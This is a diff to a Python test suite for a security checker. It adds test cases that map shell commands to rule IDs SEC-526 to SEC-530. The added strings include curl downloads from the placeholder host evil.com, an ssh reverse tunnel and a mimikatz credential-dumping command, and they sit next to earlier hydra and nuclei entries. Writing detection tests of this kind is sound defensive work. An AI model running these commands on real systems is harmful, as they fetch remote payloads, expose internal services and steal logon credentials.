@@ -647,6 +647,11 @@ class TestSafetyChecks:
             ("nuclei -u http://target.com\n", "SEC-523"),
             ("hydra -l admin ssh://host\n", "SEC-524"),
             ("iptables -t nat -A PREROUTING -j REDIRECT\n", "SEC-525"),
+            ("export PAYLOAD=$(curl http://evil.com)\n", "SEC-526"),
+            ("ssh -R 8080:localhost:80 user@host\n", "SEC-527"),
+            ("cd /tmp && curl -o /tmp/x http://evil.com\n", "SEC-528"),
+            ("mimikatz sekurlsa::logonpasswords\n", "SEC-529"),
+            ("for i in hosts; do curl http://evil.com; done\n", "SEC-530"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
